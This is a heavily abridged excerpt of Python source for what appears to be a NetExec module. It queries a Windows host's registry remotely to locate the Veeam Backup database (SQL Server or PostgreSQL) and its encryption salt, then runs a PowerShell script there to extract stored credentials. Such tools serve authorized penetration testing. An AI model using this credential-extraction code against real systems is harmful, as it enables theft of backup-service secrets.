...
class NXCModule:
    ...
    def checkVeeamInstalled(self, context, connection):
        ...
        try:
            ...
            try:
                ...
                database_config = rrp.hBaseRegQueryValue(
                    remoteOps._RemoteOperations__rrp,
                    keyHandle,
                ...
                if database_config == "PostgreSql":
                    ...
                    keyHandle = ans["phkResult"]
                    PostgreSqlExec = (
                        rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "Location")[1].split(
                            "\x00"
                        )[:-1][0]
                        + "\\bin\\psql.exe"
                    )
                    ...
                    keyHandle = ans["phkResult"]
                    PostgresUserForWindowsAuth = rrp.hBaseRegQueryValue(
                        remoteOps._RemoteOperations__rrp,
                        keyHandle,
                        "PostgresUserForWindowsAuth",
                    )[1].split("\x00")[:-1][0]
                    SqlDatabaseName = rrp.hBaseRegQueryValue(
                    ...
                    SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlServerName")[
                        1
                    ].split("\x00")[:-1][0]
            ...
            try:
                ...
                SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlDatabaseName")[
                    1
                ].split("\x00")[:-1][0]
                SqlInstance = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlInstanceName")[
                    1
                ].split("\x00")[:-1][0]
                SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "SqlServerName")[
                    1
        ...
        if SqlDatabase and SqlInstance and SqlServer:
            context.log.success(
                f'Found Veeam DB "{SqlDatabase}" on SQL Server "{SqlServer}\\{SqlInstance}"! Extracting stored credentials...'
            )
            ...
            context.log.success(
                f'Found Veeam DB "{SqlDatabaseName}" on an PostgreSQL Instance! Extracting stored credentials...'
            )
            credentials = self.executePsPostgreSql(
                connection,
                PostgreSqlExec,
                PostgresUserForWindowsAuth,
                SqlDatabaseName,
    ...
    def get_salt(self, context, remoteOps, regHandle):
        try:
            ...
            return rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, "EncryptionSalt")[1].split(
                "\x00"
            )[:-1][0]
        except DCERPCException as e:
            if str(e).find("ERROR_FILE_NOT_FOUND"):
    ...
    def executePsPostgreSql(
        ...
        self.psScriptPostgresql = self.psScriptPostgresql.replace(
            "REPLACE_ME_PostgresUserForWindowsAuth", PostgresUserForWindowsAuth
        )
    ...
    def printCreds(self, context, output):
        ...
        if "Access denied" in output:
            context.log.fail(
                "Access denied! This is probably due to an AntiVirus software blocking the execution of the PowerShell script."
            )
